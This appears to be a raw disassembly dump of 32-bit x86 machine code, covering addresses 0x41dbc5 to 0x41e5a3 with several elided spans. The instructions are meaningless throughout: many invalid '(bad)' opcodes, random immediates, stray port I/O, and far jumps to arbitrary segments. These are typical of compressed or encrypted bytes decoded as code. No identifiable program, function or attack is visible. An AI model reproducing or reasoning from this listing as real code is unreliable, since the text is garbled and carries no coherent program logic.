  41dbc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbc6:	lods   al,BYTE PTR ds:[esi]
  41dbc7:	adc    eax,0x9653b8d1
  41dbcc:	jae    0x41dbf3
  41dbce:	xchg   ebp,eax
  41dbcf:	ret    0x9078
  41dbd2:	fwait
  41dbd3:	and    eax,0x276ad444
  41dbd8:	test   DWORD PTR [esi+0x73930127],edi
  41dbde:	fadd   QWORD PTR [esi]
  41dbe0:	or     edx,DWORD PTR ds:0xdb1723d7
  41dbe6:	je     0x41dbbf
  41dbe8:	mov    cl,0xe8
  41dbea:	aam    0xe7
  41dbec:	xchg   esp,edi
  41dbee:	mov    DWORD PTR [eax-0x31],ebp
  41dbf1:	pop    ebx
  41dbf2:	es (bad) 
  41dbf4:	clc    
  41dbf5:	jg     0x41dba9
  41dbf7:	std    
  41dbf8:	pop    edx
  41dbf9:	jae    0x41dc1c
  41dbfb:	fs test eax,0xf4589a1d
  41dc01:	test   eax,ebp
  41dc03:	pop    ebp
  41dc04:	mov    ds:0x5bb572c2,eax
  41dc09:	mov    ah,0x64
  41dc0b:	(bad)  
  41dc0c:	sbb    dl,BYTE PTR [edi+eax*2+0x2c]
	...
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi-0x44f2fb0]
  41dc81:	pushf  
  41dc82:	mov    al,ds:0x13c804b
  41dc87:	add    BYTE PTR [ecx+eax*1],al
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	test   DWORD PTR [ebp+0x60],ebp
  41dc8f:	scas   eax,DWORD PTR es:[edi]
  41dc90:	xchg   edx,eax
  41dc91:	pop    edi
  41dc92:	xor    bh,BYTE PTR [eax]
  41dc94:	out    0x2,eax
  41dc96:	add    eax,0xf7a4924b
  41dc9b:	or     al,0x62
  41dc9d:	das    
  41dc9e:	jae    0x41dd0b
  41dca0:	xlat   BYTE PTR ds:[ebx]
  41dca1:	dec    DWORD PTR fs:[edx]
  41dca4:	out    dx,eax
  41dca5:	sbb    ebx,DWORD PTR [eax]
  41dca7:	push   eax
  41dca8:	push   eax
  41dca9:	fcom   DWORD PTR [edi+edi*1-0x53]
  41dcad:	mov    ecx,0x63d5fae0
  41dcb2:	je     0x41dd2a
  41dcb4:	mov    ch,0x10
  41dcb6:	out    dx,eax
  41dcb7:	jne    0x41dc99
  41dcb9:	div    BYTE PTR [edx]
  41dcbb:	fwait
  41dcbc:	idiv   BYTE PTR [ebx+0x403191d7]
  41dcc2:	popf   
  41dcc3:	(bad)  
  41dcc4:	in     eax,0x10
  41dcc6:	jp     0x41dca5
  41dcc8:	fstp   DWORD PTR [ebx+0x56ba4fa8]
  41dcce:	jg     0x41dcd4
  41dcd0:	int3   
  41dcd1:	jmp    0x41dcb2
  41dcd3:	dec    edi
  41dcd4:	push   esi
  41dcd5:	jo     0x41dc82
  41dcd7:	cmp    DWORD PTR gs:[esi],0x38
  41dcdb:	xchg   BYTE PTR [ebp+0x40],dl
  41dcde:	lea    esi,ds:0x4ff42c08
  41dce4:	aad    0xcc
  41dce6:	lods   eax,DWORD PTR ds:[esi]
  41dce7:	leave  
  41dce8:	and    dh,BYTE PTR [edi+0x60]
  41dceb:	xchg   edi,eax
  41dcec:	les    eax,FWORD PTR [edi-0x609a8496]
  41dcf2:	into   
  41dcf3:	sti    
  41dcf4:	and    al,BYTE PTR [edi-0x24]
  41dcf7:	cld    
  41dcf8:	ret    
  41dcf9:	fidiv  WORD PTR [edi-0x58c02d73]
  41dcff:	jo     0x41dcf9
  41dd01:	bound  esi,QWORD PTR ds:0x98bdd58b
  41dd07:	sub    BYTE PTR [eax-0x1fde1235],cl
  41dd0d:	scas   al,BYTE PTR es:[edi]
  41dd0e:	mov    cl,0x5b
  41dd10:	or     eax,0xc024779f
  41dd15:	inc    ebp
  41dd16:	mov    DWORD PTR [ebx+0x3ced0d9f],esi
  41dd1c:	pusha  
  41dd1d:	and    al,0xda
  41dd1f:	pop    ecx
  41dd20:	je     0x41dd65
  41dd22:	iret   
  41dd23:	inc    esi
  41dd24:	cmp    BYTE PTR [esi+0x61],ch
  41dd27:	sub    BYTE PTR [edx+0x4f],dl
  41dd2a:	pop    es
  41dd2b:	fcmovb st,st(4)
  41dd2d:	mov    edi,0xc8ad6f83
  41dd32:	dec    esi
  41dd33:	add    eax,0x1d5bf502
  41dd38:	push   ss
  41dd39:	dec    esi
  41dd3a:	push   ecx
  41dd3b:	add    ebp,DWORD PTR [eax]
  41dd3d:	adc    bl,bl
  41dd3f:	inc    edi
  41dd40:	inc    DWORD PTR [edi]
  41dd42:	loopne 0x41dd34
  41dd44:	pop    edx
  41dd45:	mov    eax,ds:0x2d119ba7
  41dd4a:	jg     0x41dd28
  41dd4c:	fmul   st,st(1)
  41dd4e:	add    al,0x62
  41dd50:	mov    ebp,0x2df5ec54
  41dd55:	jns    0x41ddb7
  41dd57:	jl     0x41dd7a
  41dd59:	push   esi
  41dd5a:	rcl    ebp,cl
  41dd5c:	adc    al,0x4f
  41dd5e:	pusha  
  41dd5f:	jns    0x41dd49
  41dd61:	add    DWORD PTR [ecx-0x64033d41],edi
  41dd67:	adc    BYTE PTR [ecx-0x11a3873b],bl
  41dd6d:	add    dh,al
  41dd6f:	inc    eax
  41dd70:	sub    BYTE PTR ds:0x3cb7332d,al
  41dd76:	dec    edx
  41dd77:	and    ch,al
  41dd79:	daa    
  41dd7a:	in     eax,dx
  41dd7b:	sub    DWORD PTR [ebx+0x405a317f],edi
  41dd81:	int    0x9f
  41dd83:	fcmovb st,st(7)
  41dd85:	lea    esi,[eax-0x4f]
  41dd88:	push   0xffffffa6
  41dd8a:	test   eax,0xf587a041
  41dd8f:	dec    esp
	...
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	in     al,0xbf
  41de02:	push   edx
  41de03:	leave  
  41de04:	test   BYTE PTR ds:0x1040001,bh
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de0d:	mov    eax,ds:0xfb6187db
  41de12:	or     DWORD PTR [eax-0x48],esp
  41de15:	sahf   
  41de16:	fist   DWORD PTR [edi]
  41de18:	(bad)
  41de1c:	and    BYTE PTR [esi-0x53a2896],dh
  41de22:	imul   ecx,DWORD PTR [ebp+0x6f],0x37044035
  41de29:	cld    
  41de2a:	stc    
  41de2b:	call   0xac52b9db
  41de30:	mov    WORD PTR [eax+0x55],?
  41de33:	les    eax,FWORD PTR [eax+ebx*8-0xa554bb8]
  41de3a:	or     DWORD PTR [edi+0x2a],edi
  41de3d:	mov    cl,0x3a
  41de3f:	jmp    0x41ddd6
  41de41:	test   eax,0xba3aeb8f
  41de46:	outs   dx,BYTE PTR ds:[esi]
  41de47:	into   
  41de48:	mov    ds:0x472fa89c,al
  41de4d:	pop    ss
  41de4e:	xchg   ebp,eax
  41de4f:	or     eax,0x4d8438df
  41de54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de56:	mov    ah,0xef
  41de58:	dec    edx
  41de59:	mov    ch,bh
  41de5b:	jb     0x41de0b
  41de5d:	dec    eax
  41de5e:	pop    ds
  41de5f:	cs in  eax,0xb4
  41de62:	xchg   esi,eax
  41de63:	fisub  DWORD PTR [ebx-0x63]
  41de66:	movlhps xmm7,xmm1
  41de69:	or     al,0x62
  41de6b:	in     eax,dx
  41de6c:	repnz mov dl,0xfe
  41de6f:	mov    ebp,0x95ebf5b2
  41de74:	mov    cl,0xbf
  41de76:	mov    esp,0x41461e30
  41de7b:	jl     0x41deb3
  41de7d:	or     DWORD PTR [ecx-0x6b],edx
  41de80:	cdq    
  41de81:	out    dx,al
  41de82:	data16 mov ah,0xe0
  41de85:	dec    edi
  41de86:	push   esp
  41de87:	xchg   esi,eax
  41de88:	jl     0x41de15
  41de8a:	pusha  
  41de8b:	sti    
  41de8c:	adc    BYTE PTR [eax-0x3c59dd1b],cl
  41de92:	mov    eax,ds:0x19ee2995
  41de97:	sub    DWORD PTR [ecx-0x78],eax
  41de9a:	sar    DWORD PTR [edi],1
  41de9c:	push   ebx
  41de9d:	mov    bh,0x4b
  41de9f:	cmp    eax,0x64fe0cad
  41dea4:	ds in  al,dx
  41dea6:	push   DWORD PTR [edx]
  41dea8:	lahf   
  41dea9:	data16 hlt 
  41deab:	inc    ebx
  41deac:	adc    al,0x46
  41deae:	sub    esi,DWORD PTR [eax+0x3e]
  41deb1:	shl    al,0xb8
  41deb4:	addr16 test eax,0xbed3dc9f
  41deba:	dec    esi
  41debb:	xor    eax,0xdada13be
  41dec0:	lods   al,BYTE PTR ds:[esi]
  41dec1:	test   al,0x4c
  41dec3:	cmp    al,0x6c
  41dec5:	cmpxchg BYTE PTR [edx],ah
  41dec8:	inc    edx
  41dec9:	pop    esi
  41deca:	push   ds
  41decb:	pop    esp
  41decc:	pop    ss
  41decd:	xor    ebp,eax
  41decf:	stc    
  41ded0:	ret    
  41ded1:	dec    eax
  41ded2:	xchg   edi,eax
  41ded3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ded4:	pop    ds
  41ded5:	xchg   BYTE PTR [bx],bl
  41ded8:	sub    esp,ebx
  41deda:	in     eax,0x2c
  41dedc:	stos   DWORD PTR es:[edi],eax
  41dedd:	stos   BYTE PTR es:[edi],al
  41dede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dedf:	xchg   esi,eax
  41dee0:	mov    ebp,0xf5278c46
  41dee5:	push   esp
  41dee6:	(bad)  
  41dee7:	rcl    DWORD PTR [edx+edx*1-0x31b8da60],1
  41deee:	adc    eax,DWORD PTR [ecx]
  41def0:	leave  
  41def1:	mov    bh,bl
  41def3:	out    dx,al
  41def4:	pop    esi
  41def5:	push   0xadd0dbc3
  41defa:	mov    eax,0x592d3a4e
  41deff:	mov    esi,0xf341e368
  41df04:	lds    esi,FWORD PTR [ebp+0x46]
  41df07:	dec    edi
  41df08:	dec    esi
  41df09:	hlt    
  41df0a:	outs   dx,DWORD PTR ds:[esi]
  41df0b:	mul    eax
  41df0d:	dec    ecx
  41df0e:	jo     0x41df57
	...
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xb61c9ce9
  41df82:	out    0x37,al
  41df84:	mov    BYTE PTR [esi],bh
  41df86:	add    DWORD PTR [eax],eax
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	repnz das 
  41df8e:	stos   DWORD PTR es:[edi],eax
  41df8f:	xchg   esp,ecx
  41df91:	xor    al,BYTE PTR [ebx-0x12]
  41df94:	inc    esi
  41df95:	push   ds
  41df96:	dec    eax
  41df97:	loopne 0x41dfe3
  41df99:	nop
  41df9a:	inc    edx
  41df9b:	sub    al,0xa9
  41df9d:	xor    bl,al
  41df9f:	mov    ah,0xea
  41dfa1:	sub    eax,0x31fe3ff4
  41dfa6:	push   ebp
  41dfa7:	scas   eax,DWORD PTR es:[edi]
  41dfa8:	adc    DWORD PTR [ecx],ebx
  41dfaa:	repnz mov esi,0x5d26dc4f
  41dfb0:	xlat   BYTE PTR ds:[ebx]
  41dfb1:	jae    0x41df90
  41dfb3:	mov    al,0xaa
  41dfb5:	rcl    BYTE PTR [esi+0x41f70fd1],cl
  41dfbb:	(bad)  
  41dfbc:	push   ds
  41dfbd:	iret   
  41dfbe:	add    ecx,DWORD PTR [eax]
  41dfc0:	push   ebp
  41dfc1:	adc    DWORD PTR [esi+0x0],0xffffffe3
  41dfc5:	ror    DWORD PTR [ebx],cl
  41dfc7:	call   0x17d2:0x46ad75ad
  41dfce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfcf:	stos   BYTE PTR es:[edi],al
  41dfd0:	sub    DWORD PTR [esi],ecx
  41dfd2:	int    0x33
  41dfd4:	jnp    0x41df61
  41dfd6:	aad    0xe2
  41dfd8:	fistp  WORD PTR [edi]
  41dfda:	in     eax,dx
  41dfdb:	call   0x48775f26
  41dfe0:	stos   BYTE PTR es:[edi],al
  41dfe1:	push   0xffffffe1
  41dfe3:	ror    DWORD PTR [ebp-0x19c8867],1
  41dfe9:	and    BYTE PTR [edi-0x74ebe70d],dl
  41dfef:	xchg   ebx,eax
  41dff0:	push   ebx
  41dff1:	imul   ebp,DWORD PTR [eiz*2+0x6f634d05],0x21
  41dff9:	fdivp  st(4),st
  41dffb:	or     ecx,DWORD PTR [ecx]
  41dffd:	pop    esp
  41dffe:	mov    ds:0xc7bc297a,eax
  41e003:	sbb    dh,BYTE PTR [ebx-0x4c]
  41e006:	repz mov dh,0x41
  41e009:	cmp    al,0x24
  41e00b:	mov    cl,0x56
  41e00d:	outs   dx,BYTE PTR ds:[esi]
  41e00e:	mov    BYTE PTR ds:0x8af9bcac,cl
  41e014:	jb     0x41dfe4
  41e016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e017:	push   0x55
  41e019:	imul   ebp,DWORD PTR [ecx],0x2b8a927d
  41e01f:	aas    
  41e020:	out    dx,eax
  41e021:	or     ah,ah
  41e023:	mov    eax,0xee1223f6
  41e028:	(bad)  
  41e029:	cs out 0x15,al
  41e02c:	and    BYTE PTR [edi-0x14],bh
  41e02f:	inc    esp
  41e030:	lods   al,BYTE PTR ds:[esi]
  41e031:	push   0xc370d6a3
  41e036:	mov    edi,0x29df5fd7
  41e03b:	push   ecx
  41e03c:	mov    ah,0x86
  41e03e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e03f:	dec    ebx
  41e040:	repnz adc eax,0xd465e844
  41e046:	mov    ecx,0xee1ed9de
  41e04b:	lock xor eax,DWORD PTR [eax+0x841eef0]
  41e052:	outs   dx,DWORD PTR ds:[esi]
  41e053:	gs sub eax,0xb87d016
  41e059:	jle    0x41e007
  41e05b:	mov    ecx,0x9a56ea75
  41e060:	popf   
  41e061:	xchg   edx,eax
  41e062:	mov    ebp,0x39d2dd6f
  41e067:	clc    
  41e068:	sub    cl,ah
  41e06a:	adc    al,0xa1
  41e06c:	sar    DWORD PTR [esp+eax*8+0x40],0xc0
  41e071:	pop    esp
  41e072:	jae    0x41e097
  41e074:	jle    0x41e018
  41e076:	jp     0x41e037
  41e078:	sub    esi,DWORD PTR [esi+eax*1]
  41e07b:	push   0xffffff85
  41e07d:	cmp    eax,0x6dd46441
  41e082:	inc    edi
  41e083:	ficomp DWORD PTR [ebp-0x5894c844]
  41e089:	addr16 pushf 
  41e08b:	xchg   DWORD PTR [edi+0xef858d],ebx
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	push   0x2c
  41e102:	xchg   DWORD PTR [ebx-0x74],edi
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    al,0x1
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	jmp    0xe2890e5f
  41e111:	lds    eax,FWORD PTR [edx]
  41e113:	(bad)  
  41e115:	pop    ebx
  41e116:	clc    
  41e117:	dec    esi
  41e118:	data16 jp 0x41e188
  41e11b:	aam    0x3e
  41e11d:	sbb    esi,DWORD PTR [edi-0x3f]
  41e120:	push   ebp
  41e121:	(bad)  
  41e123:	gs inc esp
  41e125:	test   al,0x25
  41e127:	sti    
  41e128:	sub    BYTE PTR [ecx],ch
  41e12a:	adc    dl,ch
  41e12c:	icebp  
  41e12d:	scas   eax,DWORD PTR es:[edi]
  41e12e:	cmp    al,0x73
  41e130:	(bad)  
  41e131:	xchg   ecx,eax
  41e132:	or     edi,DWORD PTR [edx-0x5d6c71aa]
  41e138:	imul   ebx,ecx,0xffffff9e
  41e13b:	in     al,0x31
  41e13d:	stc    
  41e13e:	jbe    0x41e0ca
  41e140:	pop    ecx
  41e141:	sub    DWORD PTR [ebp+0x1],0xe407e228
  41e148:	xor    BYTE PTR [esi+0x2f],0x65
  41e14c:	retf   
  41e14d:	dec    ebx
  41e14e:	push   ds
  41e14f:	arpl   WORD PTR [ebx-0x31bc3962],di
  41e155:	sub    ebx,edx
  41e157:	rol    DWORD PTR [eax+0x762c5c4b],0x92
  41e15e:	stos   BYTE PTR es:[edi],al
  41e15f:	jp     0x41e0f7
  41e161:	(bad)  
  41e162:	in     eax,dx
  41e163:	dec    edx
  41e164:	cld    
  41e165:	imul   ebx,ecx,0xffffff91
  41e168:	stos   DWORD PTR es:[edi],eax
  41e169:	dec    ebp
  41e16a:	int3   
  41e16b:	sbb    BYTE PTR [eax+0x67],dh
  41e16e:	in     al,dx
  41e16f:	inc    edx
  41e170:	hlt    
  41e171:	adc    ebp,DWORD PTR [edi+ebx*8+0x5e]
  41e175:	push   ss
  41e176:	call   0xa784b1b5
  41e17b:	mov    ch,dh
  41e17d:	sbb    eax,0x8d9d96e9
  41e182:	cdq    
  41e183:	das    
  41e184:	ss popa 
  41e186:	imul   ebx,esi,0xffffff84
  41e189:	mov    esp,0x9290be04
  41e18e:	mov    DWORD PTR ds:0xac4724b0,0x78ae783
  41e198:	and    edx,ecx
  41e19a:	jg     0x41e19c
  41e19c:	xchg   esp,eax
  41e19d:	jle    0x41e1bb
  41e19f:	addr16 retf 0x16be
  41e1a3:	or     dh,0xb9
  41e1a6:	leave  
  41e1a7:	lds    esi,FWORD PTR ss:[eax+eiz*8-0x4898c36]
  41e1af:	pop    ebp
  41e1b0:	push   esp
  41e1b1:	nop
  41e1b2:	or     dh,BYTE PTR [edx-0x65]
  41e1b5:	test   DWORD PTR cs:0xb099950c,0x35c1f4d3
  41e1c0:	push   edx
  41e1c1:	mov    dl,0xdc
  41e1c3:	fcomp  DWORD PTR [esp+esi*8-0x5c]
  41e1c7:	mov    bh,BYTE PTR [edx-0x39]
  41e1ca:	imul   edx,DWORD PTR [esp+0x1f],0xa61d65af
  41e1d2:	fucomi st,st(7)
  41e1d4:	sub    ecx,edx
  41e1d6:	fwait
  41e1d7:	or     edx,DWORD PTR [eax-0x6d46af91]
  41e1dd:	rcr    DWORD PTR [eax],cl
  41e1df:	mov    esi,edx
  41e1e1:	cmc    
  41e1e2:	inc    ebx
  41e1e3:	push   ds
  41e1e4:	lahf   
  41e1e5:	adc    al,0xa4
  41e1e7:	std    
  41e1e8:	(bad)  
  41e1e9:	mov    ch,0x10
  41e1eb:	xchg   dh,ch
  41e1ed:	and    al,0xd4
  41e1ef:	or     eax,0xbf5aa0a1
  41e1f4:	xchg   ebx,eax
  41e1f5:	push   ecx
  41e1f6:	mov    bl,0xd4
  41e1f8:	aad    0x89
  41e1fa:	inc    ebp
  41e1fb:	ds hlt 
  41e1fd:	mov    ebp,0x19f7ccbd
  41e202:	mov    cl,0xd3
  41e204:	jne    0x41e1ed
  41e206:	test   ebp,esi
  41e208:	imul   esp,DWORD PTR [eax+0x147588a0],0xf47
	...
  41e272:	add    BYTE PTR [eax],al
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0x40
  41e281:	jp     0x41e294
  41e283:	aad    0x90
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	loope  0x41e2a8
  41e28e:	dec    esp
  41e28f:	cmc    
  41e290:	addr16 leave 
  41e292:	pop    ss
  41e293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e294:	pop    edx
  41e295:	das    
  41e296:	xchg   ebp,eax
  41e297:	xor    eax,0xf083a5e1
  41e29c:	fisub  DWORD PTR [ecx-0xc6c88ca]
  41e2a2:	dec    DWORD PTR [eax-0x6f689509]
  41e2a8:	mov    ch,0xaf
  41e2aa:	xchg   ebx,eax
  41e2ab:	out    dx,eax
  41e2ac:	sub    dl,bh
  41e2ae:	cmp    DWORD PTR [esi-0x55],esi
  41e2b1:	mov    esi,DWORD PTR [ecx+0x44]
  41e2b4:	mov    dh,0x30
  41e2b6:	mov    esi,0x9f21138d
  41e2bb:	mov    eax,0xfce0af57
  41e2c0:	lock clc 
  41e2c2:	jae    0x41e2ef
  41e2c4:	jge    0x41e2cf
  41e2c6:	daa    
  41e2c7:	out    0x7f,eax
  41e2c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2ca:	dec    ebp
  41e2cb:	mov    BYTE PTR [ebp+0xb],ch
  41e2ce:	std    
  41e2cf:	xchg   esi,eax
  41e2d0:	ins    DWORD PTR es:[edi],dx
  41e2d1:	ja     0x41e29e
  41e2d3:	cmp    al,0xbd
  41e2d5:	sbb    BYTE PTR [edx+0x5c],bl
  41e2d8:	aas    
  41e2d9:	mov    esi,0xfe352346
  41e2de:	repz lds edi,FWORD PTR [ebx+0x48db21e7]
  41e2e5:	and    ecx,DWORD PTR [edx+esi*4]
  41e2e8:	arpl   WORD PTR [edx-0x56],di
  41e2eb:	lods   al,BYTE PTR ds:[esi]
  41e2ec:	ds pop edx
  41e2ee:	retf   0x3f84
  41e2f1:	stos   BYTE PTR es:[di],al
  41e2f3:	test   bh,ch
  41e2f5:	cmc    
  41e2f6:	dec    ecx
  41e2f7:	fisttp QWORD PTR [ecx+0x22]
  41e2fa:	mov    bh,dh
  41e2fc:	push   ebx
  41e2fd:	dec    edx
  41e2fe:	inc    ebp
  41e2ff:	jns    0x41e325
  41e301:	sbb    ch,cl
  41e303:	fadd   DWORD PTR [esi-0x2efd28af]
  41e309:	mov    bh,0x5b
  41e30b:	stos   DWORD PTR es:[edi],eax
  41e30c:	cld    
  41e30d:	cmp    al,0xa6
  41e30f:	aam    0x8a
  41e311:	jmp    0x1a70d8a9
  41e316:	lock dec edi
  41e318:	cmp    dh,BYTE PTR ds:0xa81645bd
  41e31e:	mov    dh,0xc8
  41e320:	(bad)  
  41e321:	in     eax,0xc3
  41e323:	out    dx,al
  41e324:	fwait
  41e325:	mov    ch,0xe
  41e327:	dec    ebx
  41e328:	jmp    0xa3db:0x3c9072f9
  41e32f:	mov    dl,ah
  41e331:	ja     0x41e34c
  41e333:	nop
  41e334:	mov    edi,edx
  41e336:	jno    0x41e324
  41e338:	mov    esp,0x8d3dd8fe
  41e33d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e33e:	jmp    0xb4e1:0xb56188be
  41e345:	jno    0x41e2cb
  41e347:	xor    DWORD PTR [ebx+0x4e061bf2],ebp
  41e34d:	add    DWORD PTR [edi+0x3216ff28],esp
  41e353:	into   
  41e354:	mov    eax,DWORD PTR [esi-0x5f]
  41e357:	repnz pop edx
  41e359:	loop   0x41e2dd
  41e35b:	into   
  41e35c:	test   DWORD PTR [edi],0xabff2df1
  41e362:	push   0x36b46218
  41e367:	test   DWORD PTR [eax],ebx
  41e369:	lods   al,BYTE PTR ds:[esi]
  41e36a:	loope  0x41e332
  41e36c:	push   ebx
  41e36d:	mov    al,0x4f
  41e36f:	aad    0x17
  41e371:	(bad)  
  41e373:	daa    
  41e374:	(bad)  
  41e375:	adc    bh,BYTE PTR ss:[eax-0x1677dc5f]
  41e37c:	inc    esi
  41e37d:	add    ebx,DWORD PTR [ecx]
  41e37f:	scas   al,BYTE PTR es:[edi]
  41e380:	xor    esi,DWORD PTR [edx]
  41e382:	test   eax,0xff7e7d18
  41e387:	repnz fnstcw WORD PTR [ecx+0x494bf50c]
  41e38e:	int3   
  41e38f:	xchg   BYTE PTR [eax],al
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0xa5241409
  41e403:	iret   
  41e404:	xchg   esp,eax
  41e405:	inc    ecx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    al,0x1
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	aam    0xa3
  41e40e:	(bad)  
  41e40f:	jb     0x41e3e7
  41e411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e412:	aaa    
  41e413:	pusha  
  41e414:	xchg   ebx,eax
  41e415:	mov    ds,WORD PTR [ecx+esi*4]
  41e418:	cmp    al,0x80
  41e41a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41e41c:	jmp    0xeaa698d0
  41e421:	fwait
  41e422:	cmp    BYTE PTR [edx+0x4905e5d1],ch
  41e428:	mov    dh,0x9f
  41e42a:	xchg   edi,eax
  41e42b:	icebp  
  41e42c:	stos   BYTE PTR es:[edi],al
  41e42d:	add    ebp,DWORD PTR [ecx]
  41e42f:	popf   
  41e430:	cmc    
  41e431:	ss push edi
  41e433:	xlat   BYTE PTR ds:[ebx]
  41e434:	dec    edi
  41e435:	mov    eax,0x9a521790
  41e43a:	jb     0x41e45f
  41e43c:	inc    ebx
  41e43d:	xchg   ecx,eax
  41e43e:	out    0xc6,eax
  41e440:	out    0x14,al
  41e442:	loop   0x41e3df
  41e444:	and    ebx,DWORD PTR [ebx]
  41e446:	dec    edx
  41e447:	retf   
  41e448:	es mov ecx,0x6d0621b0
  41e44e:	call   0x6b4f:0xe0e4e8ce
  41e455:	(bad)  
  41e456:	icebp  
  41e457:	jo     0x41e4a6
  41e459:	fdiv   DWORD PTR [ebx-0x57]
  41e45c:	cmp    ebp,DWORD PTR fs:[edi+edx*8+0x7e2355a3]
  41e464:	std    
  41e465:	icebp  
  41e466:	in     eax,dx
  41e467:	mov    eax,ds:0x8413a57e
  41e46c:	jle    0x41e4c6
  41e46e:	in     al,dx
  41e46f:	test   al,0xe1
  41e471:	add    BYTE PTR [ecx-0xa],dh
  41e474:	mov    DWORD PTR [edi],ebp
  41e476:	pop    edx
  41e477:	lock lock sbb DWORD PTR [ebp*8-0x7e3ee4be],esi
  41e480:	mov    BYTE PTR [eax-0x7c02a592],al
  41e486:	retf   
  41e487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e488:	and    DWORD PTR [esi+0x6b],0x69aed7c1
  41e48f:	jnp    0x41e435
  41e491:	leave  
  41e492:	in     eax,dx
  41e493:	mov    bl,0x89
  41e495:	mov    BYTE PTR [ebp+0x5e67cbe5],ah
  41e49b:	xchg   ebx,eax
  41e49c:	fnstcw WORD PTR [eax-0x47]
  41e49f:	jecxz  0x41e520
  41e4a1:	je     0x41e42e
  41e4a3:	hlt    
  41e4a4:	sahf   
  41e4a5:	pop    esi
  41e4a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4a7:	push   ss
  41e4a8:	xchg   DWORD PTR [eax],edx
  41e4aa:	(bad)  
  41e4ab:	scas   eax,DWORD PTR es:[edi]
  41e4ac:	test   al,0x58
  41e4ae:	clc    
  41e4af:	jge    0x41e50d
  41e4b1:	js     0x41e434
  41e4b3:	into   
  41e4b4:	and    al,0x37
  41e4b6:	fisubr DWORD PTR [edi+0x16]
  41e4b9:	jl     0x41e43c
  41e4bb:	jbe    0x41e527
  41e4bd:	repnz adc eax,0x683e1f06
  41e4c3:	xor    al,0xb6
  41e4c5:	mov    BYTE PTR [edx-0x7df97bdd],cl
  41e4cb:	mov    ah,0x1d
  41e4cd:	fnstenv [ecx-0x48]
  41e4d0:	aas    
  41e4d1:	add    ecx,DWORD PTR [ebx+0x59545c2a]
  41e4d7:	jmp    0x41e49d
  41e4d9:	mov    WORD PTR [esi-0x17],ds
  41e4dc:	arpl   WORD PTR [ebx+0x1755b00b],di
  41e4e2:	bound  eax,QWORD PTR [ebx]
  41e4e4:	mov    edx,0x156f2c4b
  41e4e9:	jle    0x41e4f7
  41e4eb:	stos   BYTE PTR es:[edi],al
  41e4ec:	or     al,0xa5
  41e4ee:	pop    esi
  41e4ef:	inc    esi
  41e4f0:	dec    esi
  41e4f1:	sub    DWORD PTR [edx+0x6],esi
  41e4f4:	(bad)  
  41e4f5:	popf   
  41e4f6:	bound  ebp,QWORD PTR [ecx+0x53]
  41e4f9:	sbb    eax,0x7d504908
  41e4fe:	shl    dh,cl
  41e500:	or     DWORD PTR [eax+0x28],ebp
  41e503:	xchg   DWORD PTR [ebx+0x1a1e1fb5],eax
  41e509:	repnz push ebp
  41e50b:	jne    0x41e4fe
  41e50d:	cmp    al,BYTE PTR [ebx+0xd7]
	...
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5b4
  41e581:	xor    BYTE PTR [edx+0x1429889],dl
  41e587:	add    BYTE PTR [ecx+eax*1],al
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	test   al,0x68
  41e58e:	lea    edi,[esi]
  41e590:	mov    esi,0xca292f72
  41e595:	xor    edi,DWORD PTR [edi+ecx*2]
  41e598:	xchg   edx,eax
  41e599:	shr    DWORD PTR [edx+0x46],cl
  41e59c:	dec    edx
  41e59d:	inc    DWORD PTR [ecx-0x35]
  41e5a0:	scas   al,BYTE PTR es:[edi]
  41e5a1:	jae    0x41e528
  41e5a3:	xor    eax,0x7e91c270
